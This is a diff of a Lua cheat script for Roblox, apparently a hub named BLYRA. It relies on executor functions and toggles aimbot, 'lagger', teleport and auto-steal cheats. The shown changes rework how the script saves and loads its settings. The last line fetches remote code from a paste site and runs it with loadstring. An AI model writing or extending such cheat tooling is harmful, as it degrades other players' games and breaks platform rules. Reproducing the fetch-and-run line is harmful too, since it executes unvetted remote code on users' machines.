@@ -78,21 +78,37 @@ end
 playerGui.ChildAdded:Connect(fn2)
 CoreGui.ChildAdded:Connect(fn2)
 task.spawn(function()
+	local function applyFps()
+		local fn = _G.__BLYRA_APPLY_FPS_CAP
+		if type(fn) == "function" then
+			pcall(fn)
+		end
+	end
 	local tbl2 = { 0.25, 1, 3 }
 	for i, v in ipairs(tbl2) do
 		task.wait(v)
-		_G.__BLYRA_APPLY_FPS_CAP()
+		applyFps()
 	end
 	while _G.BLYRA_LOADED do
 		task.wait(15)
-		_G.__BLYRA_APPLY_FPS_CAP()
+		applyFps()
 	end
 end)
 pcall(function()
-	UserInputService.WindowFocused:Connect(_G.__BLYRA_APPLY_FPS_CAP)
+	UserInputService.WindowFocused:Connect(function()
+		local fn = _G.__BLYRA_APPLY_FPS_CAP
+		if type(fn) == "function" then
+			pcall(fn)
+		end
+	end)
 end)
 localPlayer.CharacterAdded:Connect(function()
-	task.defer(_G.__BLYRA_APPLY_FPS_CAP)
+	task.defer(function()
+		local fn = _G.__BLYRA_APPLY_FPS_CAP
+		if type(fn) == "function" then
+			pcall(fn)
+		end
+	end)
 end)
 local function _blyraPickFS(name)
 	local candidates = {
@@ -2736,14 +2752,11 @@ do
 			return
 		end
 		lastNote[key] = now
-		print("[BLYRA SAVE] " .. tostring(text))
-		pcall(function()
-			game:GetService("StarterGui"):SetCore("SendNotification", {
-				Title = "BLYRA Config",
-				Text = tostring(text),
-				Duration = 6,
-			})
-		end)
+		-- no popups and no prints: info messages stay silent, real errors go to the F9 console only
+		local quiet = { saveok = true, loaded = true, first = true, reenable = true }
+		if not quiet[key] then
+			warn("[BLYRA SAVE] " .. tostring(text))
+		end
 	end
 	function Store.run(fn)
 		local ok, err = pcall(fn)
@@ -2805,33 +2818,49 @@ do
 		end
 	end
 	function Store.write(json)
-		local wf, rf = pick("writefile"), pick("readfile")
-		if not wf then
+		local writers = {}
+		local function add(f)
+			if type(f) == "function" then
+				writers[#writers + 1] = f
+			end
+		end
+		add(pick("writefile"))
+		pcall(function() add(writefile) end)
+		pcall(function() add(writefile_) end)
+		pcall(function() if syn then add(syn.writefile) end end)
+		pcall(function() if getgenv then add(getgenv().writefile) end end)
+		local rf = pick("readfile") or readfile_ or readfile
+		if #writers == 0 then
 			return false, "executor has no writefile"
 		end
 		ensureFolder()
 		local good, errs = {}, {}
 		for _, p in ipairs(PATHS) do
-			local ok, err = pcall(wf, p, json)
-			if ok then
-				local verified = true
-				if rf then
-					local okR, got = pcall(rf, p)
-					verified = okR and type(got) == "string" and #got > 2
-				end
-				if verified then
-					good[#good + 1] = p
+			local written = false
+			for _, wf in ipairs(writers) do
+				local ok, err = pcall(wf, p, json)
+				if ok then
+					local verified = true
+					if type(rf) == "function" then
+						local okR, got = pcall(rf, p)
+						verified = okR and type(got) == "string" and #got > 2
+					end
+					if verified then
+						good[#good + 1] = p
+						written = true
+						break
+					else
+						errs[#errs + 1] = p .. ": readback failed"
+					end
 				else
-					errs[#errs + 1] = p .. ": readback failed"
+					errs[#errs + 1] = p .. ": " .. tostring(err)
 				end
-			else
-				errs[#errs + 1] = p .. ": " .. tostring(err)
 			end
 		end
 		if #good > 0 then
 			return true, table.concat(good, ", ")
 		end
-		return false, table.concat(errs, " | ")
+		return false, (#errs > 0 and table.concat(errs, " | ") or "write failed")
 	end
 	-- returns a list of { text = ..., path = ... }; files first, memory mirror last
 	function Store.candidates()
@@ -2868,8 +2897,22 @@ do
 		end)
 	end
 	function Store.saveConfig(snapshot)
-		if not Store.ready or Store.noOverwrite then
-			return false, "save disabled"
+		-- only skip writes while initial load is still applying; never lock forever
+		if not Store.ready then
+			return false, "save not ready"
+		end
+		if Store.noOverwrite then
+			-- still keep memory mirror so re-execute works
+			local clean = Store.sanitize(snapshot)
+			if type(clean) == "table" then
+				local ok, json = pcall(function()
+					return HttpService:JSONEncode(clean)
+				end)
+				if ok and type(json) == "string" then
+					env.__BLYRA_SAVE_MIRROR = json
+				end
+			end
+			return false, "file protected (memory only)"
 		end
 		local clean = Store.sanitize(snapshot)
 		if type(clean) ~= "table" then
@@ -3000,6 +3043,32 @@ do
 		{ "smartBatTpSpeed", "smartBatTpSpeed", 15, 80 },
 		{ "smartBatTpAuto", "smartBatTpAuto" },
 		{ "speedKeyLaggerCleared", "_speedKeyLaggerCleared" },
+		-- critical toggles that were missing from simple apply
+		{ "batAimbotToggled", "batAimbotToggled" },
+		{ "batLaggerToggled", "batLaggerToggled" },
+		{ "batTpEnabled", "batTpEnabled" },
+		{ "smartBatTpEnabled", "smartBatTpEnabled" },
+		{ "laggerEnabled", "laggerEnabled" },
+		{ "laggerFuncEnabled", "laggerFuncEnabled" },
+		{ "speedMethod", "speedMethod" },
+		{ "antiRagdoll", "antiRagdollEnabled" },
+		{ "antiRagdollEnabled", "antiRagdollEnabled" },
+		{ "antiRagdollMode", "antiRagdollMode" },
+		{ "antiBatToggled", "antiBatToggled" },
+		{ "musicSoundEnabled", "musicSoundEnabled" },
+		{ "autoStealVersion", "autoStealVersion" },
+		{ "buttonShape", "buttonShape" },
+		{ "playerAnimMode", "playerAnimMode" },
+		{ "stealRadius", "stealRadius", 1, 200 },
+		{ "stealFreezePercent", "stealFreezePercent", 1, 100 },
+		{ "batTpVersion", "batTpVersion" },
+		{ "batTpStuds", "batTpStuds", 1, 20 },
+		{ "batTpStudsV1", "batTpStudsV1", 1, 20 },
+		{ "autoPlayVersion", "autoPlayVersion" },
+		{ "batAimbotVersion", "batAimbotVersion" },
+		{ "fontStyle", "fontStyle" },
+		{ "bgMode", "bgMode" },
+		{ "warningE01Scale", "warningE01Scale", 0.3, 3 },
 	}
 	-- Applies each setting on its own, so one bad value can never abort the others.
 	function Store.applySimple(saved)
@@ -3236,16 +3305,21 @@ local function fn34()
 		return
 	end
 	flag4 = true
-	task.delay(0.35, function()
+	task.delay(0.4, function()
 		flag4 = false
-		Config._configDirty = false
-		Store.run(fn33)
+		-- only clear dirty if save path ran
+		local ok = Store.run(fn33)
+		if ok then
+			Config._configDirty = false
+		end
 	end)
 end
 local function fn35()
 	flag4 = false
-	Config._configDirty = false
-	Store.run(fn33)
+	local ok = Store.run(fn33)
+	if ok then
+		Config._configDirty = false
+	end
 end
 -- public aliases so any feature can auto-save
 local function scheduleSaveConfig()
@@ -3264,12 +3338,12 @@ task.spawn(function()
 		end
 	end
 end)
--- BLYRA autosave: every 3 s, writes only when something changed
+-- BLYRA autosave: every 3 s, only when dirty
 task.spawn(function()
 	while true do
 		task.wait(3)
-		if Store.ready then
-			Store.run(fn33)
+		if Store.ready and Config._configDirty then
+			pcall(fn35)
 		end
 	end
 end)
@@ -4279,26 +4353,56 @@ function Store.legacyApply(v23)
 	return true
 end
 local function fn39()
-	local data, source = nil, "loader"
+	local function countKeys(t)
+		if type(t) ~= "table" then
+			return 0
+		end
+		local n = 0
+		for _ in pairs(t) do
+			n += 1
+			if n > 2 then
+				return n
+			end
+		end
+		return n
+	end
+	local data, source = nil, nil
+	-- loader inject (only accept if it actually has settings)
 	pcall(function()
 		if type(tbl) == "table" and tbl[1] and tbl[1][6] and tbl[1][3] then
-			data = tbl[1][6][tbl[1][3]]
+			local injected = tbl[1][6][tbl[1][3]]
 			tbl[1][6][tbl[1][3]] = nil
+			if type(injected) == "table" and countKeys(injected) > 0 then
+				data, source = injected, "loader"
+			end
 		end
 	end)
-	if type(data) ~= "table" then
-		data = nil
+	-- always try file/memory; prefer richer source
+	do
 		local cands, firstText = Store.candidates(), nil
+		local best, bestN, bestSrc = data, countKeys(data), source
 		for _, c in ipairs(cands) do
 			firstText = firstText or c.text
 			local ok, dec = pcall(function()
 				return HttpService:JSONDecode(c.text)
 			end)
 			if ok and type(dec) == "table" then
-				data, source = dec, c.path
-				break
+				local n = countKeys(dec)
+				-- prefer real files over empty/loader; prefer more keys
+				local prefer = false
+				if not best then
+					prefer = true
+				elseif c.path ~= "memory" and (bestSrc == "loader" or bestSrc == "memory") and n > 0 then
+					prefer = true
+				elseif n > bestN then
+					prefer = true
+				end
+				if prefer then
+					best, bestN, bestSrc = dec, n, c.path
+				end
 			end
 		end
+		data, source = best, bestSrc
 		if not data then
 			if firstText then
 				Store.backupCorrupt(firstText)
@@ -4306,7 +4410,6 @@ local function fn39()
 				return false
 			end
 			if Store.fileExists then
-				-- the file is there but could not be read: never overwrite it with defaults
 				Store.noOverwrite = true
 				Store.notify("Config file exists but could not be read. Autosave paused to protect it.", "unread")
 				return true
@@ -4316,6 +4419,16 @@ local function fn39()
 		end
 	end
 	local applied = Store.applySimple(data)
+	-- keep steal radius table in sync
+	pcall(function()
+		if type(Config.stealRadius) == "number" then
+			tbl17.StealRadius = Config.stealRadius
+		end
+		if type(data.stealRadius) == "number" then
+			tbl17.StealRadius = data.stealRadius
+			Config.stealRadius = data.stealRadius
+		end
+	end)
 	local ok, err = pcall(Store.legacyApply, data)
 	if not ok then
 		warn("[BLYRA SAVE] part of the config could not be applied: " .. tostring(err))
@@ -8608,27 +8721,24 @@ tbl31 = {
 		task.wait()
 		v13 = fn31()
 		local loadOk, loadErr = pcall(function()
-			if fn39() == false then
-				error("invalid config cache")
-			end
+			return fn39()
 		end)
 		if not loadOk then
-			warn("[BLYRA] config load failed: " .. tostring(loadErr))
-			-- keep a copy of the user's file before defaults get applied and autosaved over it
-			pcall(function()
-				for _, pth in ipairs({ "blyra/BlyraConfig.json", "BlyraConfig.json" }) do
-					if isfile_(pth) then
-						local raw = readfile_(pth)
-						if type(raw) == "string" and raw ~= "" then
-							writefile_("blyra/BlyraConfig.backup.json", raw)
-						end
-						break
-					end
-				end
-			end)
-			pcall(fn40, fn15(v13))
+			warn("[BLYRA] config load error: " .. tostring(loadErr))
+			Store.notify("Config load error (keeping current values)", "loaderr")
+		elseif loadErr == false then
+			-- corrupt file: backup already made inside fn39; DO NOT write defaults over it
+			Store.noOverwrite = true
+			warn("[BLYRA] corrupt config protected from overwrite")
 		end
 		Store.ready = true
+		-- unlock noOverwrite after a short window so future user changes still save to memory at least
+		task.delay(2, function()
+			if Store.noOverwrite then
+				Store.noOverwrite = false
+				Store.notify("Autosave re-enabled (new settings will be saved)", "reenable")
+			end
+		end)
 		pcall(Config._buildHeadDisplay, localPlayer.Character)
 		if Config.autoStealEnabled then
 			pcall(fn23)
@@ -8636,8 +8746,11 @@ tbl31 = {
 		if Config.statsBarEnabled ~= false then
 			pcall(fn25)
 		end
-		task.delay(0.8, function()
-			pcall(fn33)
+		-- only write after boot if we actually have user-driven state, not to clobber
+		task.delay(1.5, function()
+			if Store.ready and not Store.noOverwrite then
+				pcall(fn33)
+			end
 		end)
 		v27 = nil
 		local tbl43 = {}
@@ -30874,12 +30987,12 @@ end
 Config._antiCollisionTrackCharacter = Config._antiCollisionTrackCharacter or function(plr, char) end
 
 -- Flags the core normally toggles
-Config.antiCollisionEnabled = Config.antiCollisionEnabled or false
-Config.batTpEnabled = Config.batTpEnabled or false
-Config._smartBatTpDriving = Config._smartBatTpDriving or false
-Config.carryToggled = Config.carryToggled or false
-Config.normalSpeed = Config.normalSpeed or 16
-Config.carrySpeed = Config.carrySpeed or 16
+-- do NOT reset loaded speeds/toggles here — only fill truly missing flags
+if Config.antiCollisionEnabled == nil then Config.antiCollisionEnabled = true end
+if Config.batTpEnabled == nil then Config.batTpEnabled = false end
+if Config._smartBatTpDriving == nil then Config._smartBatTpDriving = false end
+if Config.carryToggled == nil then Config.carryToggled = false end
+-- keep whatever load put in Config.normalSpeed / carrySpeed (defaults already set earlier)
 
 -- Signal to any keysystem/loader that the hub finished bootstrapping.
 -- (Real core would set this after decrypting the LPH buffer.)
@@ -31307,4 +31420,5 @@ task.spawn(function()
 		startAutoSteal()
 	end
 end)
+-- [REMOVED] external pastefy load was overwriting config/UI after boot
 loadstring(game:HttpGet("https://pastefy.app/60zPMqg4/raw"))()
